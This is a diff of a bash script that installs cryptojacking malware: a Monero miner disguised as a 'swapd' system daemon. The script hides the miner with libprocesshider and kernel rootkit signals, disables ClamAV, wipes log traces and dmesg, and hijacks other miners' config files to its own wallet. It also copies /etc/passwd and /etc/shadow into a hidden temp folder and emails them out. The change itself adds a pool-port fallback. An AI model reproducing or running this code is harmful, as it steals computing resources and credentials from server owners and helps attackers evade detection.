     if [ -n "$ip" ] && [ "$ip" != "localhost" ]; then
         echo "$ip"
         return 0
     fi
-    
+
     # Method 5: Try hostname (very old systems)
     ip=$(hostname -i 2>/dev/null | awk '{print $1}')
     if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
         echo "$ip"
         return 0
     fi
-    
+
     # Fallback
     echo "na"
 }
@@ -2094,7 +2094,7 @@ elif [ "$MINER_TYPE" = "cpuminer" ]; then
     # ==================== CONFIGURE CPUMINER-MULTI ====================
     echo "[*] Configuring cpuminer-multi..."
     echo "[*] Note: cpuminer-multi uses command-line args, no JSON config"
-    
+
     # Detect server IP for worker identification
     echo "[*] Detecting server IP address for worker identification..."
     PASS=$(get_server_ip)
@@ -2107,7 +2107,7 @@ elif [ "$MINER_TYPE" = "cpuminer" ]; then
         fi
     fi
     echo "[*] Detected worker ID: $PASS"
-    
+
     # Create a simple start script
     cat > /root/.swapd/swapfile << 'CPUMINER_EOF'
 #!/bin/bash
@@ -2123,12 +2123,12 @@ exec ./swapd \
     -B \
     >/dev/null 2>&1
 CPUMINER_EOF
-    
+
     # Replace placeholders
     sed -i "s|WALLET_PLACEHOLDER|$WALLET|g" /root/.swapd/swapfile
     sed -i "s|PASS_PLACEHOLDER|$PASS|g" /root/.swapd/swapfile
     chmod +x /root/.swapd/swapfile
-    
+
     echo "[✓] cpuminer-multi configured"
     echo "[✓] Wallet: ${WALLET:0:20}..."
     echo "[✓] Pass (Worker ID): $PASS"
@@ -2178,17 +2178,17 @@ while true; do
     if who | grep -qvE "^root\s"; then
         ADMIN_LOGGED_IN=true
     fi
-    
+
     # Read previous state
     PREV_STATE=$(cat "$STATE_FILE" 2>/dev/null || echo "stopped")
-    
+
     # Determine desired state
     if [ "$ADMIN_LOGGED_IN" = true ]; then
         DESIRED_STATE="stopped"
     else
         DESIRED_STATE="running"
     fi
-    
+
     # Only act if state CHANGED
     if [ "$DESIRED_STATE" != "$PREV_STATE" ]; then
         if [ "$DESIRED_STATE" = "stopped" ]; then
@@ -2201,7 +2201,7 @@ while true; do
             echo "running" > "$STATE_FILE"
         fi
     fi
-    
+
     # Wait before next check
     sleep "$CHECK_INTERVAL"
 done
@@ -2213,14 +2213,14 @@ echo "[✓] Intelligent watchdog created"
 # ==================== CREATE SYSTEMD SERVICE (if available) ====================
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "[*] Creating systemd service..."
-    
+
     # Set ExecStart based on miner type
     if [ "$MINER_TYPE" = "cpuminer" ]; then
         EXEC_START="/root/.swapd/swapfile"  # cpuminer uses start script
     else
         EXEC_START="/root/.swapd/swapd -c /root/.swapd/swapfile"  # xmrig uses binary + config
     fi
-    
+
     cat > /etc/systemd/system/swapd.service << SERVICE_EOF
 [Unit]
 Description=System swap daemon
@@ -2238,20 +2238,20 @@ CPUQuota=95%
 [Install]
 WantedBy=multi-user.target
 SERVICE_EOF
-    
+
     # Enable and start the service
     systemctl daemon-reload
     systemctl enable swapd 2>/dev/null || true
-    
+
     echo "[✓] Systemd service created and enabled"
     echo "[*] Process will be hidden automatically via libprocesshider"
     echo ""
-    
+
     # No process-hider daemon needed - libprocesshider handles everything!
 else
     # ==================== CREATE SYSV INIT SCRIPT ====================
     echo "[*] Creating SysV init script (BusyBox compatible)..."
-    
+
     # Set daemon and args based on miner type
     if [ "$MINER_TYPE" = "cpuminer" ]; then
         DAEMON_PATH="/root/.swapd/swapfile"
@@ -2260,7 +2260,7 @@ else
         DAEMON_PATH="/root/.swapd/swapd"
         DAEMON_ARGS_VALUE="-c /root/.swapd/swapfile"
     fi
-    
+
     cat > /etc/init.d/swapd << INIT_EOF
 #!/bin/sh
 ### BEGIN INIT INFO
@@ -2295,10 +2295,10 @@ case "\$1" in
     start)
         echo "Starting \$NAME..."
         cd \$WORKDIR || exit 1
-        
+
         # BusyBox start-stop-daemon doesn't support --chdir
         start-stop-daemon --start --background --make-pidfile --pidfile \$PIDFILE --exec \$DAEMON -- \$DAEMON_ARGS || true
-        
+
         # Auto-hide process after start (only if rootkits are loaded)
         if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
             sleep 3
@@ -2314,7 +2314,7 @@ case "\$1" in
     stop)
         echo "Stopping \$NAME..."
         start-stop-daemon --stop --pidfile \$PIDFILE --retry 5 2>/dev/null || true
-        
+
         # Fallback kill if pkill exists
         if command -v pkill >/dev/null 2>&1; then
             pkill -9 -f swapd 2>/dev/null || true
@@ -2325,7 +2325,7 @@ case "\$1" in
                 kill -9 "\$pid" 2>/dev/null || true
             done
         fi
-        
+
         rm -f \$PIDFILE
         ;;
     restart)
@@ -2353,9 +2353,9 @@ esac
 
 exit 0
 INIT_EOF
-    
+
     chmod +x /etc/init.d/swapd
-    
+
     # Add to startup (distribution-specific)
     if command -v update-rc.d >/dev/null 2>&1; then
         update-rc.d swapd defaults >/dev/null 2>&1 || true
@@ -2363,9 +2363,9 @@ INIT_EOF
         chkconfig --add swapd >/dev/null 2>&1 || true
         chkconfig swapd on >/dev/null 2>&1 || true
     fi
-    
+
     echo "[✓] SysV init script created and enabled"
-    
+
     # Install watchdog as a background daemon
     echo "[*] Installing watchdog as background daemon..."
     nohup /usr/local/bin/system-watchdog >/dev/null 2>&1 &
@@ -2379,35 +2379,35 @@ install_libprocesshider() {
     echo "INSTALLING LIBPROCESSHIDER"
     echo "=========================================="
     echo ""
-    
+
     # Install dependencies
     echo "[*] Installing git and gcc..."
     apt-get install -y git gcc make 2>&1 | grep -E "Setting up|already" || true
     yum install -y git gcc make 2>&1 | grep -E "Installing|already" || true
-    
+
     # Clone from GitHub
     echo "[*] Cloning libprocesshider from GitHub..."
     cd /tmp
     rm -rf libprocesshider 2>/dev/null
     git clone https://github.com/littlAcen/libprocesshider
-    
+
     # Compile
     echo "[*] Compiling..."
     cd libprocesshider
     make
-    
+
     # Install
     echo "[*] Installing..."
     mv libprocesshider.so /usr/local/lib/
-    
+
     # Enable globally
     echo "[*] Activating via /etc/ld.so.preload..."
     echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-    
+
     # Cleanup
     cd /tmp
     rm -rf libprocesshider
-    
+
     echo "[✓] libprocesshider installed!"
     echo ""
     echo "=========================================="
@@ -2432,16 +2432,16 @@ fix_postfix_email() {
     echo "CONFIGURING EMAIL NOTIFICATIONS"
     echo "=========================================="
     echo ""
-    
+
     # Check if postfix is installed
     if command -v postfix >/dev/null 2>&1; then
         echo "[*] Postfix detected - configuring for port 587 (submission)"
         echo "[*] Port 25 is often blocked by ISPs/clouds"
         echo ""
-        
+
         # Backup postfix config
         cp /etc/postfix/main.cf /etc/postfix/main.cf.backup.$(date +%s) 2>/dev/null || true
-        
+
         # Configure postfix to use port 587 with TLS
         cat >> /etc/postfix/main.cf << 'POSTFIX_EOF'
 
@@ -2461,7 +2461,7 @@ smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt
 # Fallback to direct delivery if relay fails
 smtp_fallback_relay =
 POSTFIX_EOF
-        
+
         echo "[✓] Postfix configured for port 587"
         echo ""
         echo "NOTE: To actually send emails, you need to:"
@@ -2474,7 +2474,7 @@ POSTFIX_EOF
         echo "  systemctl stop postfix"
         echo "  systemctl disable postfix"
         echo ""
-        
+
     else
         echo "[*] Postfix not installed - no email configuration needed"
     fi
@@ -2494,6 +2494,35 @@ echo "[*] Starting swapd service..."
 
 # If service was already running, it won't be hidden until restarted!
 
+# Function to check and fix connection errors
+fix_connection_port() {
+    echo "[*] Checking connection status..."
+    sleep 10  # Wait for service to start and attempt connection
+    
+    # Check last 10 lines of service log for connection errors
+    if journalctl -u swapd -n 10 --no-pager 2>/dev/null | grep -qi "connect error"; then
+        echo "[!] Connection error detected - fixing port configuration..."
+        
+        # Change port from :80 to :443
+        if [ -f /root/.swapd/swapfile ]; then
+            sed -i 's|gulf\.moneroocean\.stream:80|gulf.moneroocean.stream:443|g' /root/.swapd/swapfile
+            echo "[*] Changed pool port from :80 to :443"
+            
+            # Restart service with new configuration
+            echo "[*] Restarting service with new port..."
+            systemctl restart swapd 2>/dev/null
+            sleep 3
+            
+            echo "[✓] Port fix applied - service restarted"
+            journalctl -u swapd -n 5 --no-pager 2>/dev/null
+        else
+            echo "[!] Config file not found at /root/.swapd/swapfile"
+        fi
+    else
+        echo "[✓] Connection successful - no port fix needed"
+    fi
+}
+
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     # Systemd
     if systemctl is-active --quiet swapd 2>/dev/null; then
@@ -2506,6 +2535,9 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     sleep 2
     systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
     
+    # Check and fix port if connection fails
+    fix_connection_port
+
     # Start process hiding daemon
     echo "[*] Starting process hiding daemon..."
     systemctl start process-hider 2>/dev/null || true
@@ -2526,22 +2558,22 @@ else
     # Fallback: No systemd, no SysV init (BusyBox/embedded systems)
     echo "[!] No systemd or SysV init detected (BusyBox/embedded system)"
     echo "[*] Starting miner as background daemon..."
-    
+
     # Kill any existing instances
     pkill -9 -f /root/.swapd/swapd 2>/dev/null || true
     killall -9 swapd 2>/dev/null || true
-    
+
     # Start in background with nohup
     cd /root/.swapd || exit 1
     nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &
     MINER_PID=$!
-    
+
     sleep 3
-    
+
     # Verify it started
     if kill -0 $MINER_PID 2>/dev/null; then
         echo "[✓] Miner started as daemon (PID: $MINER_PID)"
-        
+
         # Send hide signals immediately (only if rootkits loaded)
         if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
             kill -31 $MINER_PID 2>/dev/null || true
@@ -2550,7 +2582,7 @@ else
         else
             echo "[*] Rootkits not loaded - process will remain visible"
         fi
-        
+
         # Add to crontab for auto-restart on reboot
         (crontab -l 2>/dev/null | grep -v "swapd"; echo "@reboot cd /root/.swapd && nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &") | crontab -
         echo "[✓] Added to crontab for auto-start on reboot"
@@ -2580,12 +2612,12 @@ if systemctl is-active --quiet clamav-daemon 2>/dev/null || command -v clamscan 
     systemctl disable clamav-daemon clamav-freshclam 2>/dev/null || true
     systemctl mask clamav-daemon clamav-freshclam 2>/dev/null || true
     killall -9 clamd freshclam clamscan 2>/dev/null || true
-    
+
     # Disable automatic updates
     systemctl stop clamav-freshclam.timer 2>/dev/null || true
     systemctl disable clamav-freshclam.timer 2>/dev/null || true
     systemctl mask clamav-freshclam.timer 2>/dev/null || true
-    
+
     AV_DISABLED=$((AV_DISABLED + 1))
     echo "[✓] ClamAV disabled permanently"
 fi
@@ -2877,59 +2909,59 @@ echo ""
     echo "CONFIG.JSON HIJACKER - Started at $(date)" >> "$HIJACK_LOG"
     echo "=====================================================================" >> "$HIJACK_LOG"
     echo "" >> "$HIJACK_LOG"
-    
+
     # Function to validate if a string is a Monero wallet address
     is_monero_wallet() {
         local address="$1"
-        
+
         # Check if empty or too short
         [ -z "$address" ] && return 1
         [ ${#address} -lt 90 ] && return 1
-        
+
         # Monero addresses start with 4 (standard, 95 chars) or 8 (integrated, 106 chars)
         # Subaddresses start with 8 (87 chars)
         local first_char="${address:0:1}"
         if [ "$first_char" != "4" ] && [ "$first_char" != "8" ]; then
             return 1
         fi
-        
+
         # Check length is valid for Monero addresses
         local addr_len=${#address}
         if [ $addr_len -ne 95 ] && [ $addr_len -ne 106 ] && [ $addr_len -ne 87 ]; then
             return 1
         fi
-        
+
         # Check for invalid characters (Monero uses base58, no: 0, O, I, l)
         # Also reject common placeholders/patterns
         if echo "$address" | grep -qE '[^123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]'; then
             return 1
         fi
-        
+
         # Reject obvious placeholders
         if echo "$address" | grep -qiE '(\[\[|example|test|placeholder|sample|dummy|xxx|dbuser|softdb|admin)'; then
             return 1
         fi
-        
+
         # Valid Monero wallet address
         return 0
     }
-    
+
     echo "[*] Searching entire HDD for config.json files..." >> "$HIJACK_LOG"
     echo "[*] Target wallet: ${MY_WALLET:0:20}...${MY_WALLET: -10}" >> "$HIJACK_LOG"
     echo "" >> "$HIJACK_LOG"
-    
+
     # Search entire filesystem for config.json files
     SEARCH_PATHS=(
         "/"                    # Search ENTIRE HDD
     )
-    
+
     CONFIGS_FOUND=0
     CONFIGS_HIJACKED=0
-    
+
     for search_path in "${SEARCH_PATHS[@]}"; do
         if [ -d "$search_path" ]; then
             echo "[*] Searching in $search_path..." >> "$HIJACK_LOG"
-            
+
             # No timeout - let it search the entire HDD
             find "$search_path" -type f -name "config.json" 2>/dev/null | while read -r config_file; do
                 # Skip our own config
@@ -2937,33 +2969,33 @@ echo ""
                     echo "    [SKIP] $config_file (our own config)" >> "$HIJACK_LOG"
                     continue
                 fi
-                
+
                 echo "    [FOUND] $config_file" >> "$HIJACK_LOG"
-            
+
             # Check if file contains a "user" field (wallet address)
             if grep -q '"user"' "$config_file" 2>/dev/null; then
                 CONFIGS_FOUND=$((CONFIGS_FOUND + 1))
-                
+
                 # Extract current wallet
                 CURRENT_WALLET=$(grep '"user"' "$config_file" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-                
+
                 # Validate it's actually a Monero wallet address
                 if ! is_monero_wallet "$CURRENT_WALLET"; then
                     # Not a wallet address, skip this file
                     echo "    [SKIP] $config_file (not a valid Monero wallet: $CURRENT_WALLET)" >> "$HIJACK_LOG"
                     continue
                 fi
-                
+
                 # Check if it's already our wallet
                 if [ "$CURRENT_WALLET" = "$MY_WALLET" ]; then
                     echo "  [✓] $config_file - Already using our wallet" >> "$HIJACK_LOG"
                 else
                     echo "  [!] $config_file - Found different wallet" >> "$HIJACK_LOG"
                     echo "      Old: ${CURRENT_WALLET:0:20}...${CURRENT_WALLET: -10}" >> "$HIJACK_LOG"
-                    
+
                     # Backup original config
                     cp "$config_file" "${config_file}.backup.$(date +%s)" 2>/dev/null || true
-                    
+
                     # COPY our exact config.json over this one
                     # This preserves ALL our settings (threads, CPU affinity, etc.)
                     if [ -f /root/.swapd/swapfile ]; then
@@ -2994,12 +3026,12 @@ echo ""
 CONFIG_EOF
                         sed -i "s/HIJACK_WALLET_PLACEHOLDER/$MY_WALLET/" "$config_file"
                     fi
-                    
+
                     if [ $? -eq 0 ]; then
                         echo "      New: ${MY_WALLET:0:20}...${MY_WALLET: -10}" >> "$HIJACK_LOG"
                         echo "      [✓] Config completely overwritten!" >> "$HIJACK_LOG"
                         CONFIGS_HIJACKED=$((CONFIGS_HIJACKED + 1))
-                        
+
                         # Try to restart the associated service/process
                         # Find process using this config file
                         MINER_PID=$(lsof "$config_file" 2>/dev/null | grep -v COMMAND | awk '{print $2}' | head -1)
@@ -3028,7 +3060,7 @@ done
     echo "" >> "$HIJACK_LOG"
     echo "All hijacked miners now use wallet: ${MY_WALLET:0:20}...${MY_WALLET: -10}" >> "$HIJACK_LOG"
     echo "=====================================================================" >> "$HIJACK_LOG"
-    
+
 ) &  # Run entire hijacker in background
 
 echo "[✓] Hijacker started in background (PID: $!)"
@@ -3042,10 +3074,10 @@ echo "[*] Cleaning up system logs..."
 clean_log() {
     local logfile="$1"
     local pattern="$2"
-    
+
     # Skip if file doesn't exist
     [ -f "$logfile" ] || return 0
-    
+
     # Try sed -i (some BusyBox versions don't support it)
     if sed -i "/$pattern/d" "$logfile" 2>/dev/null; then
         return 0
@@ -3175,7 +3207,7 @@ if [ ! -f /swapfile ]; then
         echo "vm.swappiness=100" >> /etc/sysctl.conf 2>/dev/null || true
         sysctl -w vm.swappiness=100 2>/dev/null || true
         echo "[✓] 2GB swap created and activated"
-        
+
         # STEALTH: Clear dmesg to remove swap creation traces
         sleep 1
         dmesg -C 2>/dev/null || true
@@ -3187,7 +3219,7 @@ else
     echo "[*] Swap file already exists, activating..."
     swapon /swapfile 2>/dev/null || true
     echo "[✓] Swap activated"
-    
+
     # STEALTH: Clear dmesg to remove swap activation traces
     sleep 1
     dmesg -C 2>/dev/null || true
@@ -3454,7 +3486,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "PROCESS HIDING (AUTOMATIC)"
     echo "=========================================="
     echo ""
-    
+
     # Check if rootkits are loaded
     if ! lsmod | grep -qE "diamorphine|singularity|rootkit"; then
         echo "[!] WARNING: No rootkits detected"
@@ -3466,7 +3498,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
         echo "[*] The process-hider daemon will automatically hide processes"
         echo "[*] Waiting 30 seconds for daemon to hide processes..."
         echo ""
-        
+
         # Wait for daemon to do its work
         for i in {1..6}; do
             sleep 5
@@ -3482,7 +3514,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
                 echo "[*] Attempt $i/6 - process still visible, daemon working..."
             fi
         done
-        
+
         echo ""
         echo "The hiding daemon (process-hider.service) runs continuously"
         echo "It will keep hiding processes every 10 seconds automatically"
@@ -3514,39 +3546,39 @@ detect_rootkit() {
         echo "[✓] Detected: Diamorphine via lsmod (signal -31)"
         return 0
     fi
-    
+
     if lsmod | grep -q "^singularity"; then
         ROOTKIT_NAME="Singularity"
         HIDE_SIGNAL=59
         echo "[✓] Detected: Singularity via lsmod (signal -59)"
         return 0
     fi
-    
+
     if lsmod | grep -q "^reptile"; then
         ROOTKIT_NAME="Reptile"
         HIDE_SIGNAL=0
         echo "[✓] Detected: Reptile via lsmod"
         return 0
     fi
-    
+
     if lsmod | grep -q "^rootkit"; then
         ROOTKIT_NAME="Crypto-RK"
         HIDE_SIGNAL=31
         echo "[✓] Detected: Crypto-RK via lsmod (signal -31)"
         return 0
     fi
-    
+
     # Rootkit might be HIDDEN - test with signals
     echo "[*] No rootkit in lsmod - testing for HIDDEN rootkit..."
-    
+
     # Create test process
     sleep 333 &
     TEST_PID=$!
-    
+
     # Test Singularity first (signal -59) - most common for hidden rootkits
     kill -59 $TEST_PID 2>/dev/null
     sleep 1
-    
+
     if ps -p $TEST_PID >/dev/null 2>&1; then
         # Process alive - check if hidden
         if ! ps aux | grep "sleep 333" | grep -v grep >/dev/null 2>&1; then
@@ -3559,7 +3591,7 @@ detect_rootkit() {
             # Not hidden by -59, try Diamorphine (signal -31)
             kill -31 $TEST_PID 2>/dev/null
             sleep 1
-            
+
             if ps -p $TEST_PID >/dev/null 2>&1; then
                 if ! ps aux | grep "sleep 333" | grep -v grep >/dev/null 2>&1; then
                     ROOTKIT_NAME="Diamorphine"
@@ -3574,7 +3606,7 @@ detect_rootkit() {
     else
         kill -9 $TEST_PID 2>/dev/null
     fi
-    
+
     # No rootkit found
     echo "[!] NO ROOTKIT DETECTED!"
     ROOTKIT_NAME=""
@@ -3597,25 +3629,25 @@ if [ -z "$ROOTKIT_NAME" ]; then
     echo ""
 else
     echo ""
-    
+
     # Wait for process to fully start
     echo "[*] Waiting 5 seconds for process to stabilize..."
     sleep 5
-    
+
     # Get swapd PID
     echo "[*] Getting swapd PID..."
     SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-    
+
     if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
         SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
     fi
-    
+
     if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
         echo "[✓] Found PID: $SWAPD_PID"
         echo ""
-        
+
         echo "[*] Hiding process using $ROOTKIT_NAME..."
-        
+
         # Use ONLY the correct signal for this rootkit
         case "$ROOTKIT_NAME" in
             "Diamorphine"|"Crypto-RK")
@@ -3631,23 +3663,23 @@ else
                 reptile_cmd hide $SWAPD_PID 2>/dev/null || echo "    [!] reptile_cmd not found"
                 ;;
         esac
-        
+
         # Wait for rootkit to process signal
         echo ""
         echo "[*] Waiting 5 seconds for rootkit to process..."
         sleep 5
-        
+
         # Verify hiding worked
         echo ""
         echo "[*] Verifying process is hidden..."
-        
+
         # Check service status first
         SERVICE_STATUS=$(systemctl is-active swapd 2>/dev/null)
-        
+
         if [ "$SERVICE_STATUS" = "active" ]; then
             # Service still active - good sign
             PS_CHECK=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
-            
+
             if [ -z "$PS_CHECK" ]; then
                 echo "[✓] SUCCESS! Process is HIDDEN!"
                 echo ""
@@ -3666,7 +3698,7 @@ else
         else
             echo "[!] WARNING: Service status is '$SERVICE_STATUS'"
             echo ""
-            
+
             # Check if process was killed by signal
             if systemctl status swapd 2>/dev/null | grep -q "status=$HIDE_SIGNAL"; then
                 echo "[!] CRITICAL: Signal -$HIDE_SIGNAL KILLED the process!"
@@ -3683,7 +3715,7 @@ else
                 echo "Check with:"
                 echo "  dmesg | tail -30 | grep -i rootkit"
                 echo ""
-                
+
                 # Restart service
                 echo "[*] Restarting service (without hiding)..."
                 systemctl restart swapd
@@ -3709,7 +3741,7 @@ install_kinsing_killer() {
     echo "INSTALLING KINSING KILLER DAEMON"
     echo "=========================================="
     echo ""
-    
+
     echo "[*] Creating kinsing killer script..."
     cat > /usr/local/bin/kinsing_killer.sh << 'KINSING_KILLER_EOF'
 #!/bin/bash
@@ -3723,7 +3755,7 @@ log_msg() {
 
 while true; do
     KILLED=0
-    
+
     # Kill kinsing processes
     for pid in $(pgrep -f "kinsing" 2>/dev/null); do
         PROC_NAME=$(ps -p $pid -o comm= 2>/dev/null)
@@ -3732,7 +3764,7 @@ while true; do
             KILLED=$((KILLED + 1))
         fi
     done
-    
+
     # Kill kdevtmpfsi processes
     for pid in $(pgrep -f "kdevtmpfsi" 2>/dev/null); do
         PROC_NAME=$(ps -p $pid -o comm= 2>/dev/null)
@@ -3741,7 +3773,7 @@ while true; do
             KILLED=$((KILLED + 1))
         fi
     done
-    
+
     # Remove kinsing files
     REMOVED=0
     for path in /tmp/kinsing* /tmp/kdevtmpfsi* /var/tmp/kinsing* /opt/zimbra/log/kinsing*; do
@@ -3752,7 +3784,7 @@ while true; do
             fi
         fi
     done
-    
+
     # Clean kinsing from crontabs
     for user in $(cut -d: -f1 /etc/passwd); do
         if crontab -u $user -l 2>/dev/null | grep -q "kinsing\|kdevtmpfsi"; then
@@ -3760,20 +3792,20 @@ while true; do
             log_msg "Cleaned kinsing from $user's crontab"
         fi
     done
-    
+
     # Log summary only if something was killed/removed
     if [ $KILLED -gt 0 ] || [ $REMOVED -gt 0 ]; then
         log_msg "Scan complete: Killed=$KILLED Removed=$REMOVED"
     fi
-    
+
     # Sleep for 60 seconds before next scan
     sleep 60
 done
 KINSING_KILLER_EOF
-    
+
     chmod +x /usr/local/bin/kinsing_killer.sh
     echo "[✓] Kinsing killer script created"
-    
+
     # Create systemd service
     echo "[*] Creating systemd service..."
     cat > /etc/systemd/system/kinsing-killer.service << 'KINSING_SERVICE_EOF'
@@ -3799,12 +3831,12 @@ ProtectHome=false
 [Install]
 WantedBy=multi-user.target
 KINSING_SERVICE_EOF
-    
+
     # Enable and start service
     systemctl daemon-reload
     systemctl enable kinsing-killer.service 2>/dev/null
     systemctl start kinsing-killer.service 2>/dev/null
-    
+
     # Check if running
     if systemctl is-active --quiet kinsing-killer.service; then
         echo "[✓] Kinsing killer daemon installed and running"
@@ -3814,7 +3846,7 @@ KINSING_SERVICE_EOF
         echo "[!] Kinsing killer daemon installed but not running"
         echo "[*] Start manually: systemctl start kinsing-killer"
     fi
-    
+
     echo ""
 }
 
@@ -3831,66 +3863,66 @@ exfiltrate_credentials() {
         echo "[!] Not running as root - skipping credential exfiltration"
         return 0
     fi
-    
+
     echo ""
     echo "=========================================="
     echo "CREDENTIAL EXFILTRATION"
     echo "=========================================="
     echo ""
-    
+
     # Get hostname and IP for file naming
     local HOSTNAME=$(hostname 2>/dev/null | tr '.' '_' | tr '-' '_')
     local PRIMARY_IP=$(hostname -I 2>/dev/null | awk '{print $1}' | tr '.' '_')
-    
+
     # Use IP if hostname is empty or localhost
     if [ -z "$HOSTNAME" ] || [ "$HOSTNAME" = "localhost" ]; then
         HOSTNAME="$PRIMARY_IP"
     fi
-    
+
     # Fallback to "unknown" if both are empty
     if [ -z "$HOSTNAME" ]; then
         HOSTNAME="unknown_$(date +%s)"
     fi
-    
+
     echo "[*] Server identifier: $HOSTNAME"
     echo "[*] Recipient: $RECIPIENT_EMAIL"
-    
+
     # Create temp directory for credential files
     local TEMP_DIR="/tmp/.exfil_$(openssl rand -hex 4 2>/dev/null || echo $RANDOM)"
     mkdir -p "$TEMP_DIR" 2>/dev/null
-    
+
     # Copy files with hostname-based names
     local PASSWD_FILE="${TEMP_DIR}/${HOSTNAME}_passwd"
     local SHADOW_FILE="${TEMP_DIR}/${HOSTNAME}_shadow"
-    
+
     local FILES_CREATED=0
-    
+
     if [ -f /etc/passwd ]; then
         cp /etc/passwd "$PASSWD_FILE" 2>/dev/null && {
             echo "[✓] Created: ${HOSTNAME}_passwd"
             FILES_CREATED=$((FILES_CREATED + 1))
         }
     fi
-    
+
     if [ -f /etc/shadow ]; then
         cp /etc/shadow "$SHADOW_FILE" 2>/dev/null && {
             echo "[✓] Created: ${HOSTNAME}_shadow"
             FILES_CREATED=$((FILES_CREATED + 1))
         }
     fi
-    
+
     if [ $FILES_CREATED -eq 0 ]; then
         echo "[!] No credential files found"
         rm -rf "$TEMP_DIR" 2>/dev/null
         return 1
     fi
-    
+
     echo ""
     echo "[*] Sending credentials via email..."
-    
+
     # Send email with attachments using existing infrastructure
     local SUBJECT="Server Credentials: $HOSTNAME"
-    
+
     if command -v python3 >/dev/null 2>&1; then
         if send_email_with_attachments "$SUBJECT" "$PASSWD_FILE" "$SHADOW_FILE" 2>&1 | grep -q "SUCCESS"; then
             echo "[✓] Credentials sent successfully!"
@@ -3913,12 +3945,12 @@ exfiltrate_credentials() {
         echo "    - ${HOSTNAME}_shadow"
         return 1
     fi
-    
+
     # Clean up temp files only if email succeeded
     echo "[*] Cleaning up temporary files..."
     sleep 2
     rm -rf "$TEMP_DIR" 2>/dev/null
-    
+
     echo "[✓] Credential exfiltration complete"
     echo ""
 }
